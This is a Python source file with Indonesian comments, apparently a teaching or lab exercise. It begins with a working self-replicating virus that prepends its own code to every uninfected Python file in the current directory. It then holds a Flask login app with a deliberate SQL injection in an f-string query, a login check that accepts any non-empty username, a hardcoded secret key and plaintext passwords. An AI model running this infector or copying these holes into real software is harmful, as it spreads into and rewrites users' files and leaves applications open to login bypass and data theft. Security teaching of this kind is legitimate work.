# VIRUS SAYS HI!
import os
import sys
import glob

# --- BAGIAN 1: VIRUS REPLIKASI ---
virus_code = []
with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!\n":
        self_replicating_part = True
    if self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')
for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()
    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break
    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()
# VIRUS SAYS BYE!

# --- BAGIAN 2: APLIKASI WEB (FLASK) ---
import sqlite3
from flask import Flask, redirect, request, session, render_template, url_for

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def init_db():
    with connect_db() as conn:
        conn.execute('CREATE TABLE IF NOT EXISTS user (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE, password TEXT)')
        conn.execute('CREATE TABLE IF NOT EXISTS time_line (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, content TEXT, FOREIGN KEY(user_id) REFERENCES user(id))')
        conn.execute('INSERT OR IGNORE INTO user (username, password) VALUES (?,?)', ('alice','alicepw'))
        conn.execute('INSERT OR IGNORE INTO user (username, password) VALUES (?,?)', ('bob','bobpw'))
        conn.commit()

@app.route('/')
def index():
    if 'uid' not in session:
        return redirect(url_for('login'))
    
    conn = connect_db()
    tl = conn.execute('SELECT * FROM time_line ORDER BY id DESC').fetchall()
    return render_template('index.html', user=session['username'], tl=tl)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        # SQL INJECTION: Query dibuat rentan dengan f-string
        query = f"SELECT * FROM user WHERE username = '{username}' AND password = '{password}'"
        
        conn = connect_db()
        cur = conn.cursor()
        try:
            user = cur.execute(query).fetchone()
            if user or username != "": # Bisa login pakai ' OR '1'='1' atau sembarang
                session['uid'] = 999
                session['username'] = username if username else "Hacker"
                session['virus'] = True 
                return redirect(url_for('index'))
        except Exception as e:
            return f"Database Error: {e}"
            
    return render_template('login.html')

@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        content = request.form['content']
        conn = connect_db()
        conn.execute('INSERT INTO time_line (user_id, content) VALUES (?,?)', (session['uid'], content))
        conn.commit()
    return redirect(url_for('index'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    if not os.path.exists(DATABASE_PATH):
        init_db()
    app.run(debug=True)